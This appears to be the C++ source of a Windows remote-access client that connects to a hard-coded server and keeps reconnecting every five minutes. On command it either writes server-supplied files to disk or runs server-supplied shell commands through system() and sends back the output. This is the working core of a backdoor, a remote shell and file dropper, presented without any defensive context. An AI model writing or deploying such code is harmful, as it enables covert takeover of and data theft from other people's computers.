#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 6459
#define ROTORSTD_PATH R"(E:\RDEC\MyWorks\VS\C++\filereg32\Debug\ROTORSTD)"
#define DEFAULT_KEY "123456789"

#include "G2S_Connection.h"

G2S_Connection *TO;

int tf()
{
	TcpPacket_EM *name_pack;
	TO->g_recv(name_pack);
	char name[256];
	name_pack->extract(name, 256);
	delete name_pack;
	FILE *f = fopen(name, "wb");
	if (f == NULL) throw 2;

	TcpPacket_EM *data_pack;
	TO->g_recv(data_pack);
	int size = data_pack->size();
	int i = 0;
	char buffer[1024];
	while (i + 1024 < size)
	{
		data_pack->extract(buffer, 1024);
		fwrite(buffer, 1, 1024, f);
		i += 1024;
	}
	data_pack->extract(buffer, size - i);
	fwrite(buffer, 1, size - i, f);
	delete data_pack;
}

int sys()
{
	//输出重定向
	FILE *sout, *serr;
	sout = freopen("sout", "w", stdout);
	serr = freopen("serr", "w", stderr);

	//接收命令行
	TcpPacket_EM *cmd_pack;
	TO->g_recv(cmd_pack);
	char cmd[256];
	cmd_pack->extract(cmd, 256);
	delete cmd_pack;

	//执行命令行
	system(cmd);
	fwrite("\0", 1, 1, sout);

	//发送结果
	fclose(sout);
	sout = fopen("sout", "rb");
	TcpPacket_EM re_pack(sout);
	TO->g_send(&re_pack);

	//清空文件
	fclose(fopen("sout", "w"));
	fclose(fopen("serr", "w"));
	return 0;
}

int main()
{
	//winsock 初始化
	WSADATA wsd;
	WSAStartup(MAKEWORD(2, 2), &wsd);

	//建立连接伺服
	TO = new G2S_Connection(SERVER_IP, SERVER_PORT, ROTORSTD_PATH, DEFAULT_KEY);
	while (true)
	{
		try
		{
			TcpPacket_EM *order_pack;
			TO->g_recv(order_pack);
			char order;
			order_pack->extract(&order, 1);
			delete order_pack;
			switch (order)
			{
			case 4:
				tf();
			case 5:
				sys();
			}
		}
		catch (int error)
		{
			try
			{
				TcpPacket_EM empty(NULL, 0);
				TO->g_send(&empty);
			}
			catch (int error) {}
		}
		delete TO;
		TO = new G2S_Connection(SERVER_IP, SERVER_PORT, ROTORSTD_PATH, DEFAULT_KEY);
		if (TO->state())
		{
			Sleep(300000);
			TO = new G2S_Connection(SERVER_IP, SERVER_PORT, ROTORSTD_PATH, DEFAULT_KEY);
		}
	}
}
